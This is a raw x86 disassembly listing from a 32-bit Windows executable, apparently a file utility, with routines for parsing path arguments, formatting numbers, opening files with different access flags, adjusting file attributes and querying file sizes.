  4027c3:	mov    eax,DWORD PTR [edi+esi*4]
  4027c6:	cmp    WORD PTR [eax],cx
  4027c9:	je     0x402971
  4027cf:	push   0x408c40
  4027d4:	call   DWORD PTR ds:0x40c050
  4027da:	mov    eax,DWORD PTR [edi+esi*4]
  4027dd:	push   0x2e
  4027df:	pop    ecx
  4027e0:	cmp    cx,WORD PTR [eax]
  4027e3:	jne    0x40282d
  4027e5:	xor    ecx,ecx
  4027e7:	cmp    cx,WORD PTR [eax+0x2]
  4027eb:	jne    0x40282d
  4027ed:	lea    eax,[esp+0x10]
  4027f1:	mov    ecx,0x401178
  4027f6:	push   eax
  4027f7:	lea    eax,[esp+0x94]
  4027fe:	mov    DWORD PTR [edi+esi*4],ecx
  402801:	push   eax
  402802:	push   0x104
  402807:	push   ecx
  402808:	call   DWORD PTR ds:0x40c040
  40280e:	test   eax,eax
  402810:	je     0x4027a8
  402812:	cmp    eax,0x104
  402817:	jae    0x4027a8
  402819:	mov    eax,DWORD PTR [esp+0x10]
  40281d:	xor    ecx,ecx
  40281f:	mov    WORD PTR [eax],cx
  402822:	xor    eax,eax
  402824:	mov    DWORD PTR [esp+0x10],eax
  402828:	jmp    0x4028dd
  40282d:	lea    ecx,[esp+0x10]
  402831:	push   ecx
  402832:	lea    ecx,[esp+0x94]
  402839:	push   ecx
  40283a:	push   0x104
  40283f:	push   eax
  402840:	call   DWORD PTR ds:0x40c040
  402846:	test   eax,eax
  402848:	je     0x4027a8
  40284e:	cmp    eax,0x104
  402853:	jae    0x4027a8
  402859:	push   0x3a
  40285b:	pop    eax
  40285c:	push   eax
  40285d:	push   DWORD PTR [edi+esi*4]
  402860:	call   DWORD PTR ds:0x40c168
  402866:	pop    ecx
  402867:	pop    ecx
  402868:	test   eax,eax
  40286a:	je     0x40287b
  40286c:	sub    eax,DWORD PTR [edi+esi*4]
  40286f:	and    eax,0xfffffffe
  402872:	cmp    eax,0x2
  402875:	jne    0x40297d
  40287b:	mov    edx,DWORD PTR [edi+esi*4]
  40287e:	mov    ecx,edx
  402880:	lea    eax,[ecx+0x2]
  402883:	mov    DWORD PTR [esp+0x18],eax
  402887:	mov    ax,WORD PTR [ecx]
  40288a:	add    ecx,0x2
  40288d:	cmp    ax,WORD PTR [esp+0x1c]
  402892:	jne    0x402887
  402894:	sub    ecx,DWORD PTR [esp+0x18]
  402898:	sar    ecx,1
  40289a:	je     0x4028dd
  40289c:	mov    ecx,edx
  40289e:	lea    eax,[ecx+0x2]
  4028a1:	mov    DWORD PTR [esp+0x18],eax
  4028a5:	mov    ax,WORD PTR [ecx]
  4028a8:	add    ecx,0x2
  4028ab:	cmp    ax,WORD PTR [esp+0x1c]
  4028b0:	jne    0x4028a5
  4028b2:	sub    ecx,DWORD PTR [esp+0x18]
  4028b6:	sar    ecx,1
  4028b8:	push   0x2e
  4028ba:	pop    eax
  4028bb:	cmp    ax,WORD PTR [edx+ecx*2-0x2]
  4028c0:	jne    0x4028dd
  4028c2:	push   0x40109c
  4028c7:	lea    eax,[esp+0x94]
  4028ce:	push   0x104
  4028d3:	push   eax
  4028d4:	call   DWORD PTR ds:0x40c160
  4028da:	add    esp,0xc
  4028dd:	lea    ecx,[esp+0x90]
  4028e4:	call   0x401f95
  4028e9:	test   al,al
  4028eb:	je     0x402910
  4028ed:	push   0x401180
  4028f2:	lea    eax,[esp+0x94]
  4028f9:	push   0x104
  4028fe:	push   eax
  4028ff:	call   DWORD PTR ds:0x40c160
  402905:	add    esp,0xc
  402908:	xor    eax,eax
  40290a:	mov    DWORD PTR [esp+0x10],eax
  40290e:	jmp    0x402914
  402910:	mov    eax,DWORD PTR [esp+0x10]
  402914:	test   eax,eax
  402916:	je     0x40293a
  402918:	push   eax
  402919:	lea    eax,[esp+0x29c]
  402920:	push   0x104
  402925:	push   eax
  402926:	call   DWORD PTR ds:0x40c15c
  40292c:	mov    eax,DWORD PTR [esp+0x1c]
  402930:	add    esp,0xc
  402933:	xor    ecx,ecx
  402935:	mov    WORD PTR [eax],cx
  402938:	jmp    0x402944
  40293a:	xor    eax,eax
  40293c:	mov    WORD PTR [esp+0x298],ax
  402944:	lea    eax,[esp+0x20]
  402948:	mov    ecx,ebx
  40294a:	push   eax
  40294b:	lea    eax,[esp+0x29c]
  402952:	push   eax
  402953:	lea    eax,[esp+0x98]
  40295a:	push   eax
  40295b:	call   DWORD PTR ds:0x40c1a4
  402961:	call   ebx
  402963:	test   al,al
  402965:	jne    0x40296e
  402967:	test   BYTE PTR [esp+0x20],0x2
  40296c:	je     0x402989
  40296e:	push   0x2f
  402970:	pop    ecx
  402971:	inc    esi
  402972:	cmp    esi,DWORD PTR [ebp+0x8]
  402975:	jl     0x4027c3
  40297b:	jmp    0x402991
  40297d:	push   DWORD PTR [edi+esi*4]
  402980:	push   0x19
  402982:	call   0x402120
  402987:	pop    ecx
  402988:	pop    ecx
  402989:	mov    DWORD PTR [esp+0x28],0x1
  402991:	push   0x408c40
  402996:	call   DWORD PTR ds:0x40c050
  40299c:	mov    esi,DWORD PTR [esp+0x14]
  4029a0:	lea    eax,[esp+0x20]
  4029a4:	push   eax
  4029a5:	mov    ecx,esi
  4029a7:	call   DWORD PTR ds:0x40c1a4
  4029ad:	call   esi
  4029af:	mov    eax,DWORD PTR [esp+0x28]
  4029b3:	mov    ecx,DWORD PTR [esp+0x4a4]
  4029ba:	pop    edi
  4029bb:	pop    esi
  4029bc:	pop    ebx
  4029bd:	xor    ecx,esp
  4029bf:	call   0x406fc0
  4029c4:	mov    esp,ebp
  4029c6:	pop    ebp
  4029c7:	ret    
  4029c8:	int3   
  4029c9:	int3   
  4029ca:	int3   
  4029cb:	int3   
  4029cc:	int3   
  4029cd:	mov    edi,edi
  4029cf:	push   ebp
  4029d0:	mov    ebp,esp
  4029d2:	sub    esp,0x1c
  4029d5:	mov    eax,ds:0x408008
  4029da:	xor    eax,ebp
  4029dc:	mov    DWORD PTR [ebp-0x4],eax
  4029df:	xor    edx,edx
  4029e1:	lea    eax,[ebp-0x1c]
  4029e4:	push   edx
  4029e5:	push   eax
  4029e6:	push   0x14
  4029e8:	lea    eax,[ebp-0x18]
  4029eb:	push   eax
  4029ec:	push   edx
  4029ed:	push   edx
  4029ee:	push   0x90310
  4029f3:	push   ecx
  4029f4:	call   DWORD PTR ds:0x40c074
  4029fa:	test   eax,eax
  4029fc:	jne    0x402a1a
  4029fe:	call   DWORD PTR ds:0x40c048
  402a04:	cmp    eax,0xea
  402a09:	je     0x402a1a
  402a0b:	call   DWORD PTR ds:0x40c048
  402a11:	cmp    eax,0x7a
  402a14:	je     0x402a1a
  402a16:	xor    al,al
  402a18:	jmp    0x402a1c
  402a1a:	mov    al,0x1
  402a1c:	mov    ecx,DWORD PTR [ebp-0x4]
  402a1f:	xor    ecx,ebp
  402a21:	call   0x406fc0
  402a26:	mov    esp,ebp
  402a28:	pop    ebp
  402a29:	ret    
  402a2a:	int3   
  402a2b:	int3   
  402a2c:	int3   
  402a2d:	int3   
  402a2e:	int3   
  402a2f:	mov    edi,edi
  402a31:	push   ebx
  402a32:	push   esi
  402a33:	mov    esi,edx
  402a35:	push   edi
  402a36:	mov    edi,ecx
  402a38:	push   edi
  402a39:	lea    ebx,[esi+0x4]
  402a3c:	push   ebx
  402a3d:	call   DWORD PTR ds:0x40c158
  402a43:	pop    ecx
  402a44:	pop    ecx
  402a45:	test   eax,eax
  402a47:	jne    0x402a4d
  402a49:	mov    al,0x1
  402a4b:	jmp    0x402a8b
  402a4d:	push   0x5c
  402a4f:	pop    eax
  402a50:	cmp    ax,WORD PTR [esi]
  402a53:	jne    0x402a89
  402a55:	cmp    ax,WORD PTR [esi+0x2]
  402a59:	jne    0x402a89
  402a5b:	push   eax
  402a5c:	push   ebx
  402a5d:	call   DWORD PTR ds:0x40c168
  402a63:	pop    ecx
  402a64:	pop    ecx
  402a65:	test   eax,eax
  402a67:	je     0x402a89
  402a69:	add    eax,0x2
  402a6c:	push   0x5c
  402a6e:	push   eax
  402a6f:	call   DWORD PTR ds:0x40c168
  402a75:	pop    ecx
  402a76:	pop    ecx
  402a77:	test   eax,eax
  402a79:	je     0x402a89
  402a7b:	push   edi
  402a7c:	push   eax
  402a7d:	call   DWORD PTR ds:0x40c158
  402a83:	pop    ecx
  402a84:	pop    ecx
  402a85:	test   eax,eax
  402a87:	je     0x402a49
  402a89:	xor    al,al
  402a8b:	pop    edi
  402a8c:	pop    esi
  402a8d:	pop    ebx
  402a8e:	ret    
  402a8f:	int3   
  402a90:	int3   
  402a91:	int3   
  402a92:	int3   
  402a93:	int3   
  402a94:	mov    edi,edi
  402a96:	push   ebx
  402a97:	mov    ebx,ecx
  402a99:	push   esi
  402a9a:	mov    esi,ebx
  402a9c:	push   edi
  402a9d:	mov    edi,edx
  402a9f:	lea    ecx,[esi+0x2]
  402aa2:	mov    ax,WORD PTR [esi]
  402aa5:	add    esi,0x2
  402aa8:	test   ax,ax
  402aab:	jne    0x402aa2
  402aad:	sub    esi,ecx
  402aaf:	sar    esi,1
  402ab1:	jmp    0x402ad1
  402ab3:	cmp    esi,ecx
  402ab5:	jbe    0x402ace
  402ab7:	push   DWORD PTR [edi+0x4]
  402aba:	mov    eax,esi
  402abc:	sub    eax,ecx
  402abe:	lea    eax,[ebx+eax*2]
  402ac1:	push   eax
  402ac2:	call   DWORD PTR ds:0x40c158
  402ac8:	pop    ecx
  402ac9:	pop    ecx
  402aca:	test   eax,eax
  402acc:	je     0x402add
  402ace:	add    edi,0x8
  402ad1:	mov    ecx,DWORD PTR [edi]
  402ad3:	test   ecx,ecx
  402ad5:	jne    0x402ab3
  402ad7:	xor    al,al
  402ad9:	pop    edi
  402ada:	pop    esi
  402adb:	pop    ebx
  402adc:	ret    
  402add:	mov    al,0x1
  402adf:	jmp    0x402ad9
  402ae1:	int3   
  402ae2:	int3   
  402ae3:	int3   
  402ae4:	int3   
  402ae5:	int3   
  402ae6:	mov    edi,edi
  402ae8:	push   esi
  402ae9:	mov    edx,0x408010
  402aee:	mov    esi,ecx
  402af0:	call   0x402a94
  402af5:	test   al,al
  402af7:	je     0x402afd
  402af9:	mov    al,0x1
  402afb:	pop    esi
  402afc:	ret    
  402afd:	mov    edx,esi
  402aff:	mov    ecx,0x4014f0
  402b04:	call   0x402a2f
  402b09:	test   al,al
  402b0b:	jne    0x402b31
  402b0d:	mov    edx,esi
  402b0f:	mov    ecx,0x401500
  402b14:	call   0x402a2f
  402b19:	test   al,al
  402b1b:	jne    0x402b31
  402b1d:	mov    edx,esi
  402b1f:	mov    ecx,0x401510
  402b24:	call   0x402a2f
  402b29:	test   al,al
  402b2b:	jne    0x402b31
  402b2d:	xor    eax,eax
  402b2f:	pop    esi
  402b30:	ret    
  402b31:	xor    eax,eax
  402b33:	inc    eax
  402b34:	pop    esi
  402b35:	ret    
  402b36:	int3   
  402b37:	int3   
  402b38:	int3   
  402b39:	int3   
  402b3a:	int3   
  402b3b:	mov    edi,edi
  402b3d:	push   ebp
  402b3e:	mov    ebp,esp
  402b40:	sub    esp,0x104
  402b46:	mov    eax,ds:0x408008
  402b4b:	xor    eax,ebp
  402b4d:	mov    DWORD PTR [ebp-0x4],eax
  402b50:	mov    eax,DWORD PTR [ebp+0x10]
  402b53:	push   ebx
  402b54:	mov    DWORD PTR [ebp-0xec],eax
  402b5a:	mov    ebx,edx
  402b5c:	mov    eax,DWORD PTR [ebp+0x14]
  402b5f:	mov    edx,DWORD PTR [ecx]
  402b61:	mov    ecx,DWORD PTR [ecx+0x4]
  402b64:	push   esi
  402b65:	mov    DWORD PTR [ebp-0xf0],eax
  402b6b:	lea    esi,[ebp-0xa]
  402b6e:	xor    eax,eax
  402b70:	mov    DWORD PTR [ebp-0xe4],ebx
  402b76:	mov    WORD PTR [ebp-0xa],ax
  402b7a:	mov    DWORD PTR [ebp-0xe0],eax
  402b80:	mov    DWORD PTR [ebp-0xd4],eax
  402b86:	mov    DWORD PTR [ebp-0xfc],ecx
  402b8c:	mov    DWORD PTR [ebp-0xdc],0xa
  402b96:	mov    DWORD PTR [ebp-0xf4],0x3
  402ba0:	push   edi
  402ba1:	mov    edi,DWORD PTR [ebp+0x8]
  402ba4:	mov    DWORD PTR [ebp-0xe8],edi
  402baa:	test   ecx,ecx
  402bac:	je     0x402c68
  402bb2:	mov    edi,eax
  402bb4:	xor    eax,eax
  402bb6:	push   eax
  402bb7:	push   DWORD PTR [ebp-0xdc]
  402bbd:	push   ecx
  402bbe:	push   edx
  402bbf:	call   0x407640
  402bc4:	mov    DWORD PTR [ebp-0xd4],ecx
  402bca:	sub    esi,0x2
  402bcd:	mov    ecx,edx
  402bcf:	mov    DWORD PTR [ebp-0xd8],eax
  402bd5:	mov    edx,DWORD PTR [ebp-0xd4]
  402bdb:	inc    edi
  402bdc:	mov    DWORD PTR [ebp-0xfc],ebx
  402be2:	mov    DWORD PTR [ebp-0xfc],ecx
  402be8:	lea    eax,[edx+0x30]
  402beb:	xor    edx,edx
  402bed:	mov    WORD PTR [esi],ax
  402bf0:	mov    eax,edi
  402bf2:	div    DWORD PTR [ebp-0xf4]
  402bf8:	test   edx,edx
  402bfa:	jne    0x402c42
  402bfc:	cmp    BYTE PTR [ebp+0xc],dl
  402bff:	je     0x402c42
  402c01:	mov    edx,DWORD PTR [ebp-0xf0]
  402c07:	add    edx,0x40
  402c0a:	mov    ecx,edx
  402c0c:	lea    ebx,[ecx+0x2]
  402c0f:	mov    ax,WORD PTR [ecx]
  402c12:	add    ecx,0x2
  402c15:	cmp    ax,WORD PTR [ebp-0xe0]
  402c1c:	jne    0x402c0f
  402c1e:	sub    ecx,ebx
  402c20:	sar    ecx,1
  402c22:	lea    eax,[ecx+ecx*1]
  402c25:	push   eax
  402c26:	sub    esi,eax
  402c28:	lea    eax,[ebp-0x8]
  402c2b:	sub    eax,esi
  402c2d:	push   edx
  402c2e:	and    eax,0xfffffffe
  402c31:	push   eax
  402c32:	push   esi
  402c33:	call   DWORD PTR ds:0x40c14c
  402c39:	mov    ecx,DWORD PTR [ebp-0xfc]
  402c3f:	add    esp,0x10
  402c42:	mov    edx,DWORD PTR [ebp-0xd8]
  402c48:	test   ecx,ecx
  402c4a:	jne    0x402bb4
  402c50:	mov    ebx,DWORD PTR [ebp-0xe4]
  402c56:	mov    DWORD PTR [ebp-0xd4],edi
  402c5c:	mov    edi,DWORD PTR [ebp-0xe8]
  402c62:	mov    eax,DWORD PTR [ebp-0xd4]
  402c68:	test   edx,edx
  402c6a:	je     0x402d12
  402c70:	mov    ebx,DWORD PTR [ebp-0xd4]
  402c76:	mov    edi,DWORD PTR [ebp-0xf0]
  402c7c:	mov    ecx,DWORD PTR [ebp-0xdc]
  402c82:	mov    eax,edx
  402c84:	sub    esi,0x2
  402c87:	xor    edx,edx
  402c89:	div    ecx
  402c8b:	inc    ebx
  402c8c:	mov    DWORD PTR [ebp-0xd8],eax
  402c92:	lea    eax,[edx+0x30]
  402c95:	xor    edx,edx
  402c97:	mov    WORD PTR [esi],ax
  402c9a:	mov    eax,ebx
  402c9c:	div    DWORD PTR [ebp-0xf4]
  402ca2:	test   edx,edx
  402ca4:	jne    0x402cf0
  402ca6:	cmp    BYTE PTR [ebp+0xc],dl
  402ca9:	je     0x402cf0
  402cab:	lea    edx,[edi+0x40]
  402cae:	mov    ecx,edx
  402cb0:	lea    eax,[ecx+0x2]
  402cb3:	mov    DWORD PTR [ebp-0xfc],eax
  402cb9:	mov    ax,WORD PTR [ecx]
  402cbc:	add    ecx,0x2
  402cbf:	cmp    ax,WORD PTR [ebp-0xe0]
  402cc6:	jne    0x402cb9
  402cc8:	sub    ecx,DWORD PTR [ebp-0xfc]
  402cce:	sar    ecx,1
  402cd0:	lea    eax,[ecx+ecx*1]
  402cd3:	push   eax
  402cd4:	sub    esi,eax
  402cd6:	lea    eax,[ebp-0x8]
  402cd9:	sub    eax,esi
  402cdb:	push   edx
  402cdc:	and    eax,0xfffffffe
  402cdf:	push   eax
  402ce0:	push   esi
  402ce1:	call   DWORD PTR ds:0x40c14c
  402ce7:	mov    ecx,DWORD PTR [ebp-0xdc]
  402ced:	add    esp,0x10
  402cf0:	mov    edx,DWORD PTR [ebp-0xd8]
  402cf6:	test   edx,edx
  402cf8:	jne    0x402c82
  402cfa:	mov    edi,DWORD PTR [ebp-0xe8]
  402d00:	mov    DWORD PTR [ebp-0xd4],ebx
  402d06:	mov    ebx,DWORD PTR [ebp-0xe4]
  402d0c:	mov    eax,DWORD PTR [ebp-0xd4]
  402d12:	test   eax,eax
  402d14:	jne    0x402d21
  402d16:	sub    esi,0x2
  402d19:	push   0x30
  402d1b:	pop    eax
  402d1c:	mov    WORD PTR [esi],ax
  402d1f:	jmp    0x402d65
  402d21:	cmp    BYTE PTR [ebp+0xc],0x0
  402d25:	je     0x402d65
  402d27:	mov    edx,DWORD PTR [ebp-0xf0]
  402d2d:	add    edx,0x40
  402d30:	mov    ecx,edx
  402d32:	lea    eax,[ecx+0x2]
  402d35:	mov    DWORD PTR [ebp-0xe4],eax
  402d3b:	mov    ax,WORD PTR [ecx]
  402d3e:	add    ecx,0x2
  402d41:	cmp    ax,WORD PTR [ebp-0xe0]
  402d48:	jne    0x402d3b
  402d4a:	sub    ecx,DWORD PTR [ebp-0xe4]
  402d50:	sar    ecx,1
  402d52:	push   ecx
  402d53:	push   edx
  402d54:	push   esi
  402d55:	call   DWORD PTR ds:0x40c148
  402d5b:	add    esp,0xc
  402d5e:	test   eax,eax
  402d60:	jne    0x402d65
  402d62:	add    esi,0x2
  402d65:	mov    ecx,esi
  402d67:	lea    edx,[ecx+0x2]
  402d6a:	mov    ax,WORD PTR [ecx]
  402d6d:	add    ecx,0x2
  402d70:	cmp    ax,WORD PTR [ebp-0xe0]
  402d77:	jne    0x402d6a
  402d79:	sub    ecx,edx
  402d7b:	sar    ecx,1
  402d7d:	test   ebx,ebx
  402d7f:	je     0x402dbf
  402d81:	cmp    ecx,ebx
  402d83:	jae    0x402dbf
  402d85:	mov    edx,edi
  402d87:	cmp    ebx,ecx
  402d89:	jbe    0x402dac
  402d8b:	mov    eax,DWORD PTR [ebp-0xec]
  402d91:	lea    eax,[edi+eax*2]
  402d94:	dec    ebx
  402d95:	cmp    edx,eax
  402d97:	jae    0x402da6
  402d99:	push   0x20
  402d9b:	pop    edi
  402d9c:	mov    WORD PTR [edx],di
  402d9f:	add    edx,0x2
  402da2:	cmp    ebx,ecx
  402da4:	ja     0x402d94
  402da6:	mov    edi,DWORD PTR [ebp-0xe8]
  402dac:	mov    eax,DWORD PTR [ebp-0xec]
  402db2:	add    eax,eax
  402db4:	sub    eax,edx
  402db6:	add    eax,edi
  402db8:	push   esi
  402db9:	sar    eax,1
  402dbb:	push   eax
  402dbc:	push   edx
  402dbd:	jmp    0x402dc7
  402dbf:	push   esi
  402dc0:	push   DWORD PTR [ebp-0xec]
  402dc6:	push   edi
  402dc7:	call   DWORD PTR ds:0x40c15c
  402dcd:	add    esp,0xc
  402dd0:	lea    edx,[edi+0x2]
  402dd3:	xor    eax,eax
  402dd5:	mov    cx,WORD PTR [edi]
  402dd8:	add    edi,0x2
  402ddb:	cmp    cx,ax
  402dde:	jne    0x402dd5
  402de0:	mov    ecx,DWORD PTR [ebp-0x4]
  402de3:	sub    edi,edx
  402de5:	sar    edi,1
  402de7:	xor    ecx,ebp
  402de9:	mov    eax,edi
  402deb:	pop    edi
  402dec:	pop    esi
  402ded:	pop    ebx
  402dee:	call   0x406fc0
  402df3:	mov    esp,ebp
  402df5:	pop    ebp
  402df6:	ret    0x10
  402df9:	int3   
  402dfa:	int3   
  402dfb:	int3   
  402dfc:	int3   
  402dfd:	int3   
  402dfe:	int3   
  402dff:	int3   
  402e00:	mov    edi,edi
  402e02:	push   ebp
  402e03:	mov    ebp,esp
  402e05:	sub    esp,0x38
  402e08:	mov    eax,ds:0x408008
  402e0d:	xor    eax,ebp
  402e0f:	mov    DWORD PTR [ebp-0x4],eax
  402e12:	mov    eax,DWORD PTR [ebp+0xc]
  402e15:	push   ebx
  402e16:	push   esi
  402e17:	push   edi
  402e18:	mov    edi,DWORD PTR [ebp+0x8]
  402e1b:	or     ebx,0xffffffff
  402e1e:	test   BYTE PTR [eax],0x4
  402e21:	push   0x3
  402e23:	pop    esi
  402e24:	jne    0x402e63
  402e26:	push   0x0
  402e28:	push   0xa000000
  402e2d:	push   esi
  402e2e:	push   0x0
  402e30:	push   esi
  402e31:	push   0x181
  402e36:	push   edi
  402e37:	call   DWORD PTR ds:0x40c068
  402e3d:	mov    esi,eax
  402e3f:	cmp    esi,ebx
  402e41:	je     0x402f2e
  402e47:	mov    ecx,esi
  402e49:	call   0x4029cd
  402e4e:	test   al,al
  402e50:	je     0x402e59
  402e52:	mov    eax,esi
  402e54:	jmp    0x402f30
  402e59:	push   esi
  402e5a:	call   DWORD PTR ds:0x40c0f4
  402e60:	push   0x3
  402e62:	pop    esi
  402e63:	push   0x0
  402e65:	push   0xa000000
  402e6a:	push   esi
  402e6b:	push   0x0
  402e6d:	push   esi
  402e6e:	push   esi
  402e6f:	push   edi
  402e70:	call   DWORD PTR ds:0x40c068
  402e76:	cmp    eax,ebx
  402e78:	jne    0x402f30
  402e7e:	call   DWORD PTR ds:0x40c048
  402e84:	cmp    eax,0x5
  402e87:	jne    0x402f2e
  402e8d:	call   DWORD PTR ds:0x40c048
  402e93:	push   0x0
  402e95:	push   0xa000000
  402e9a:	push   esi
  402e9b:	push   0x0
  402e9d:	push   esi
  402e9e:	push   0x180
  402ea3:	push   edi
  402ea4:	mov    ebx,eax
  402ea6:	call   DWORD PTR ds:0x40c068
  402eac:	mov    esi,eax
  402eae:	cmp    esi,0xffffffff
  402eb1:	jne    0x402eb8
  402eb3:	or     eax,0xffffffff
  402eb6:	jmp    0x402f30
  402eb8:	lea    eax,[ebp-0x38]
  402ebb:	push   eax
  402ebc:	push   esi
  402ebd:	call   DWORD PTR ds:0x40c084
  402ec3:	test   eax,eax
  402ec5:	jne    0x402ed0
  402ec7:	push   esi
  402ec8:	call   DWORD PTR ds:0x40c0f4
  402ece:	jmp    0x402eb3
  402ed0:	mov    eax,DWORD PTR [ebp-0x38]
  402ed3:	test   al,0x1
  402ed5:	jne    0x402ee0
  402ed7:	push   ebx
  402ed8:	call   DWORD PTR ds:0x40c06c
  402ede:	jmp    0x402ec7
  402ee0:	and    eax,0xfffffffe
  402ee3:	push   eax
  402ee4:	push   edi
  402ee5:	mov    DWORD PTR [ebp-0x38],eax
  402ee8:	call   DWORD PTR ds:0x40c088
  402eee:	test   eax,eax
  402ef0:	je     0x402ec7
  402ef2:	push   0x0
  402ef4:	push   0xa000000
  402ef9:	push   0x3
  402efb:	push   0x0
  402efd:	push   0x3
  402eff:	push   0x3
  402f01:	push   edi
  402f02:	call   DWORD PTR ds:0x40c068
  402f08:	push   esi
  402f09:	mov    ebx,eax
  402f0b:	call   DWORD PTR ds:0x40c0f4
  402f11:	cmp    ebx,0xffffffff
  402f14:	je     0x402eb3
  402f16:	mov    eax,DWORD PTR [ebp-0x38]
  402f19:	or     eax,0x1
  402f1c:	push   eax
  402f1d:	push   edi
  402f1e:	mov    DWORD PTR [ebp-0x38],eax
  402f21:	call   DWORD PTR ds:0x40c088
  402f27:	test   eax,eax
  402f29:	jne    0x402f2e
  402f2b:	push   ebx
  402f2c:	jmp    0x402ec8
  402f2e:	mov    eax,ebx
  402f30:	mov    ecx,DWORD PTR [ebp-0x4]
  402f33:	pop    edi
  402f34:	pop    esi
  402f35:	xor    ecx,ebp
  402f37:	pop    ebx
  402f38:	call   0x406fc0
  402f3d:	mov    esp,ebp
  402f3f:	pop    ebp
  402f40:	ret    0x8
  402f43:	int3   
  402f44:	int3   
  402f45:	int3   
  402f46:	int3   
  402f47:	int3   
  402f48:	int3   
  402f49:	int3   
  402f4a:	int3   
  402f4b:	int3   
  402f4c:	int3   
  402f4d:	int3   
  402f4e:	int3   
  402f4f:	int3   
  402f50:	mov    edi,edi
  402f52:	push   ebp
  402f53:	mov    ebp,esp
  402f55:	push   0x0
  402f57:	push   0xa000000
  402f5c:	push   0x3
  402f5e:	push   0x0
  402f60:	push   0x5
  402f62:	push   0x81
  402f67:	push   DWORD PTR [ebp+0x8]
  402f6a:	call   DWORD PTR ds:0x40c068
  402f70:	pop    ebp
  402f71:	ret    0x8
  402f74:	int3   
  402f75:	int3   
  402f76:	int3   
  402f77:	int3   
  402f78:	int3   
  402f79:	mov    edi,edi
  402f7b:	push   ebp
  402f7c:	mov    ebp,esp
  402f7e:	sub    esp,0x70
  402f81:	mov    eax,ds:0x408008
  402f86:	xor    eax,ebp
  402f88:	mov    DWORD PTR [ebp-0x8],eax
  402f8b:	fld1   
  402f8d:	mov    eax,ecx
  402f8f:	mov    ecx,DWORD PTR [edx+0x20]
  402f92:	push   ebx
  402f93:	push   esi
  402f94:	xor    esi,esi
  402f96:	mov    DWORD PTR [ebp-0x38],ecx
  402f99:	mov    DWORD PTR [ebp-0x54],ecx
  402f9c:	mov    ebx,esi
  402f9e:	mov    ecx,DWORD PTR [edx+0x1c]
  402fa1:	mov    DWORD PTR [ebp-0x40],edx
  402fa4:	mov    DWORD PTR [ebp-0x6c],eax
  402fa7:	mov    DWORD PTR [ebp-0x60],esi
  402faa:	mov    DWORD PTR [ebp-0x44],ebx
  402fad:	mov    DWORD PTR [ebp-0x48],esi
  402fb0:	mov    DWORD PTR [ebp-0x64],0x20
  402fb7:	mov    DWORD PTR [ebp-0x3c],ecx
  402fba:	mov    DWORD PTR [ebp-0x50],ecx
  402fbd:	push   edi
  402fbe:	mov    edi,DWORD PTR [ebp+0x8]
  402fc1:	fstp   QWORD PTR [ebp-0x5c]
  402fc4:	test   eax,eax
  402fc6:	je     0x403027
  402fc8:	push   esi
  402fc9:	push   0x200080
  402fce:	push   0x4
  402fd0:	push   esi
  402fd1:	push   0x7
  402fd3:	push   0x80
  402fd8:	push   eax
  402fd9:	call   DWORD PTR ds:0x40c068
  402fdf:	mov    DWORD PTR [ebp-0x68],eax
  402fe2:	cmp    eax,0xffffffff
  402fe5:	jne    0x402ffe
  402fe7:	call   DWORD PTR ds:0x40c048
  402fed:	mov    esi,eax
  402fef:	test   esi,esi
  402ff1:	jle    0x403022
  402ff3:	movzx  esi,si
  402ff6:	or     esi,0x80070000
  402ffc:	jmp    0x403022
  402ffe:	lea    ecx,[ebp-0x64]
  403001:	push   ecx
  403002:	lea    ecx,[ebp-0x2c]
  403005:	push   ecx
  403006:	lea    ecx,[ebp-0x44]
  403009:	push   ecx
  40300a:	lea    edx,[ebp-0x48]
  40300d:	mov    ecx,eax
  40300f:	call   0x406b22
  403014:	mov    esi,eax
  403016:	push   DWORD PTR [ebp-0x68]
  403019:	call   DWORD PTR ds:0x40c0f4
  40301f:	mov    ebx,DWORD PTR [ebp-0x44]
  403022:	mov    eax,DWORD PTR [ebp-0x6c]
  403025:	jmp    0x40302c
  403027:	mov    esi,0x80070057
  40302c:	test   esi,esi
  40302e:	jns    0x40303c
  403030:	xor    esi,esi
  403032:	mov    ebx,esi
  403034:	mov    DWORD PTR [ebp-0x48],esi
  403037:	mov    DWORD PTR [ebp-0x44],ebx
  40303a:	jmp    0x40303e
  40303c:	xor    esi,esi
  40303e:	lea    ecx,[ebp-0x30]
  403041:	push   ecx
  403042:	push   eax
  403043:	call   DWORD PTR ds:0x40c05c
  403049:	cmp    DWORD PTR [ebp-0x48],0x0
  40304d:	mov    ecx,eax
  40304f:	mov    DWORD PTR [ebp-0x34],ecx
  403052:	je     0x4030bf
  403054:	cmp    ebx,0x1
  403057:	jne    0x403086
  403059:	cmp    ecx,0xffffffff
  40305c:	jne    0x403075
  40305e:	call   DWORD PTR ds:0x40c048
  403064:	test   eax,eax
  403066:	je     0x403072
  403068:	mov    ecx,esi
  40306a:	mov    DWORD PTR [ebp-0x30],esi
  40306d:	mov    DWORD PTR [ebp-0x34],ecx
  403070:	jmp    0x403075
  403072:	mov    ecx,DWORD PTR [ebp-0x34]
  403075:	push   0x57
  403077:	add    DWORD PTR [edi+0x20],0x1
  40307b:	adc    DWORD PTR [edi+0x24],esi
  40307e:	mov    esi,DWORD PTR [ebp-0x38]
  403081:	jmp    0x40313e
  403086:	cmp    ebx,0x2
  403089:	jne    0x4030bf
  40308b:	cmp    ecx,0xffffffff
  40308e:	jne    0x4030a7
  403090:	call   DWORD PTR ds:0x40c048
  403096:	test   eax,eax
  403098:	je     0x4030a4
  40309a:	mov    ecx,esi
  40309c:	mov    DWORD PTR [ebp-0x30],esi
  40309f:	mov    DWORD PTR [ebp-0x34],ecx
  4030a2:	jmp    0x4030a7
  4030a4:	mov    ecx,DWORD PTR [ebp-0x34]
  4030a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4030aa:	sub    eax,esi
  4030ac:	je     0x4030bb
  4030ae:	sub    eax,0x1
  4030b1:	je     0x4030b7
  4030b3:	push   0x58
  4030b5:	jmp    0x403077
  4030b7:	push   0x6c
  4030b9:	jmp    0x403077
  4030bb:	push   0x78
  4030bd:	jmp    0x403077
  4030bf:	mov    eax,DWORD PTR [ebp-0x40]
  4030c2:	test   DWORD PTR [eax],0x800
  4030c8:	je     0x4030ea
  4030ca:	cmp    ecx,0xffffffff
  4030cd:	jne    0x4030e6
  4030cf:	call   DWORD PTR ds:0x40c048
  4030d5:	test   eax,eax
  4030d7:	je     0x4030e3
  4030d9:	mov    ecx,esi
  4030db:	mov    DWORD PTR [ebp-0x30],esi
  4030de:	mov    DWORD PTR [ebp-0x34],ecx
  4030e1:	jmp    0x4030e6
  4030e3:	mov    ecx,DWORD PTR [ebp-0x34]
  4030e6:	push   0x43
  4030e8:	jmp    0x403077
